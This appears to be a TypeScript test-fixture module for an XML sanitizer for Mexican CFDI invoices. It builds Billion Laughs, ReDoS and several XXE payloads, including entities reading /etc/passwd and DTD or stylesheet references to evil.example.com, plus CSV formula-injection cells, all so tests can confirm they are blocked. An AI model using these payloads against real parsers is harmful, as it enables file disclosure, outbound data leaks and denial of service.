import { readFileSync, readdirSync } from 'node:fs'
import path from 'node:path'

const CWD = process.cwd()

const REAL_XML_DIR = path.join(CWD, 'java-client', 'xml-data')

export interface AttackPayload {
  name: string
  xml: string
  expectedBlocked: boolean
  expectedReason?: string
}

/**
 * Devuelve un XML real de muestra del directorio java-client/xml-data.
 * Útil para happy paths de sanitización.
 */
export function loadRealCfdiSample(index = 0): string {
  const files = readdirSync(REAL_XML_DIR).filter((f) => f.endsWith('.xml'))
  if (files.length === 0) {
    return buildMinimalValidCfdi()
  }
  const target = files[Math.min(index, files.length - 1)]
  return readFileSync(path.join(REAL_XML_DIR, target), 'utf-8')
}

/**
 * Devuelve N archivos XML reales útiles para pruebas bulk.
 */
export function loadRealCfdiSamples(n: number): string[] {
  const files = readdirSync(REAL_XML_DIR)
    .filter((f) => f.endsWith('.xml'))
    .slice(0, n)
  return files.map((f) => readFileSync(path.join(REAL_XML_DIR, f), 'utf-8'))
}

/**
 * CFDI mínimo válido sintácticamente (sin ataques, tamaño pequeño).
 */
export function buildMinimalValidCfdi(opts: { conceptos?: number } = {}): string {
  const n = opts.conceptos ?? 2
  const conceptos = Array.from({ length: n })
    .map(
      (_, i) =>
        `<cfdi:Concepto Cantidad="1" ClaveProdServ="01010101" Importe="${
          100 + i
        }" ValorUnitario="${100 + i}"></cfdi:Concepto>`
    )
    .join('')
  return `<?xml version="1.0" encoding="UTF-8"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Version="4.0" Total="200.00" SubTotal="172.41" Fecha="2026-01-01T00:00:00" TipoDeComprobante="I">
  <cfdi:Emisor Rfc="XYZ010101000" Nombre="EMPRESA SA DE CV"/>
  <cfdi:Receptor Rfc="XAXX010101000" Nombre="PUBLICO GENERAL"/>
  <cfdi:Conceptos>${conceptos}</cfdi:Conceptos>
</cfdi:Comprobante>`
}

/**
 * Genera un XML con N etiquetas <cfdi:Concepto> con CIERRE EXPLÍCITO.
 * Útil para probar el límite de 5000 conceptos y parser createConceptoRegexSafe.
 */
export function buildCfdiWithConceptos(count: number): string {
  const conceptos = Array.from({ length: count })
    .map(
      (_, i) =>
        `<cfdi:Concepto Cantidad="1" ClaveProdServ="01010101" Importe="${i}" ValorUnitario="${i}"><cfdi:Impuestos></cfdi:Impuestos></cfdi:Concepto>`
    )
    .join('')
  return `<?xml version="1.0" encoding="UTF-8"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Version="4.0">
<cfdi:Conceptos>${conceptos}</cfdi:Conceptos>
</cfdi:Comprobante>`
}

/**
 * Genera un payload XML con un ataque Billion Laughs clásico.
 * @param entities Cantidad de entidades definidas (>=128 activa la defensa)
 * @param depth Profundidad de anidamiento (>=9 activa la defensa)
 */
export function buildBillionLaughs(entities = 150, depth = 12): string {
  const declarations = Array.from({ length: entities })
    .map((_, i) => `<!ENTITY x${i} "&x${i - 1};&x${i - 1};">`)
    .join('\n')
  const deepNested = Array.from({ length: depth }).reduce(
    (acc) => `<!DOCTYPE nested [ <!ENTITY l0 "${acc}"> ]>`,
    '&x1;'
  )
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  ${declarations}
  ${deepNested}
]>
<lolz>&x${entities - 1};</lolz>`
}

/**
 * XXE clásico: DOCTYPE SYSTEM a recurso local (ej: /etc/passwd).
 */
export function buildXXESystemFile(): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4">
  <foo>&xxe;</foo>
</cfdi:Comprobante>`
}

/**
 * XXE: PUBLIC DTD external.
 */
export function buildXXEPublicExternal(): string {
  return `<?xml version="1.0"?>
<!DOCTYPE foo PUBLIC "-//OPS//DTD BAD 1.0//EN" "http://evil.example.com/xxe.dtd">
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4"><a>hi</a></cfdi:Comprobante>`
}

/**
 * XXE: Parameter entities (%).
 */
export function buildXXEParameterEntities(): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
  <!ENTITY % wrapper "<!ENTITY xxe &#37;data;>">
  %wrapper;
]>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4"><a>&xxe;</a></cfdi:Comprobante>`
}

/**
 * XXE: NDATA / Notation declaration.
 */
export function buildXXENDATANotation(): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!NOTATION xxe SYSTEM "http://evil.example.com/xxe">
  <!ENTITY payload SYSTEM "http://evil.example.com/secret" NDATA xxe>
]>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4"><a/></cfdi:Comprobante>`
}

/**
 * XXE: Processing Instructions (PI) externos como <?xml-stylesheet?>.
 */
export function buildXXEProcessingInstructionExternal(): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="http://evil.example.com/xxe.xsl"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4"><a/></cfdi:Comprobante>`
}

/**
 * XXE: Interleave comentario-doctype (bypass clásico).
 */
export function buildXXEDoctypeCommentInterleave(): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<!- -  --  -- -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4"><a>&xxe;</a></cfdi:Comprobante>`
}

/**
 * Payload diseñado para ataques ReDoS en regex de sanitización.
 * Cadena larga de espacios + caracteres de cierre retardado.
 * Tamaño ~8KB para simular un CFDI normal pero con estructura maliciosa.
 */
export function buildReDoSSpacesPayload(kb = 8): string {
  const header = `<?xml version="1.0" encoding="UTF-8"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4"><cfdi:Conceptos>`
  const evilSpaces = ' '.repeat(kb * 1024 - header.length - 100)
  const footer = `</cfdi:Conceptos></cfdi:Comprobante>`
  return header + evilSpaces + footer
}

/**
 * Build XML específico con bytes BOM UTF-8/16.
 */
export function buildWithBOM(bomType: 'UTF-8' | 'UTF-16LE' | 'UTF-16BE'): string {
  const inner = `<?xml version="1.0" encoding="UTF-8"?><a>hi</a>`
  if (bomType === 'UTF-8') return '\uFEFF' + inner
  if (bomType === 'UTF-16LE') return '\uFFFE' + inner
  return '\uFEFF' + inner
}

/**
 * UUIDs válidos RFC4122 versión 4.
 */
export const VALID_UUIDS_V4 = [
  '550e8400-e29b-41d4-a716-446655440000',
  'A6CD4427-04BB-4FE1-944D-C09C7E127C86',
  '00000000-0000-4000-8000-000000000000',
  'ffffffff-ffff-4fff-8fff-ffffffffffff'
]

/**
 * UUIDs inválidos (versión incorrecta, variante incorrecta, formato roto).
 * Versiones RFC4122 permitidas = [1-5], así que 0, 6-9 son inválidas.
 * Variante permitida = los 2 bits MSB del byte 9 = 10xx → en hex: [8,9,a,b,A,B].
 */
export const INVALID_UUIDS: Array<{ id: string; reason: string }> = [
  { id: '550e8400-e29b-01d4-a716-446655440000', reason: 'versión 0 (no permitida por [1-5])' },
  { id: '550e8400-e29b-61d4-a716-446655440000', reason: 'versión 6' },
  { id: '550e8400-e29b-71d4-a716-446655440000', reason: 'versión 7' },
  { id: '550e8400-e29b-41d4-0716-446655440000', reason: 'variante inválida 0xxx (primer nibble 0)' },
  { id: '550e8400-e29b-41d4-c716-446655440000', reason: 'variante inválida 110x MSB (c=1100 binario)' },
  { id: '550e8400e29b41d4a716446655440000', reason: 'sin guiones' },
  { id: '550e8400-e29b-41d4-a716-44665544000', reason: '35 caracteres (falta 1)' },
  { id: 'ZZZZZZZZ-ZZZZ-4ZZZ-ZZZZ-ZZZZZZZZZZZZ', reason: 'no hex' },
  { id: 'not-a-uuid-at-allllllllllllllllll', reason: 'no formato UUID' }
]

export const CSV_DDE_UNSAFE: Array<{ cell: string; label: string }> = [
  { cell: '=1+1', label: 'empieza con =' },
  { cell: '+1+1', label: 'empieza con +' },
  { cell: '-1+1', label: 'empieza con -' },
  { cell: '@SUM(A1)', label: 'empieza con @' },
  { cell: '\t=1+1', label: 'empieza con tab + =' },
  { cell: '|1|2|=cmd|', label: 'empieza con pipe' },
  { cell: '%0A=cmd', label: 'empieza con secuencia LF + =' }
]
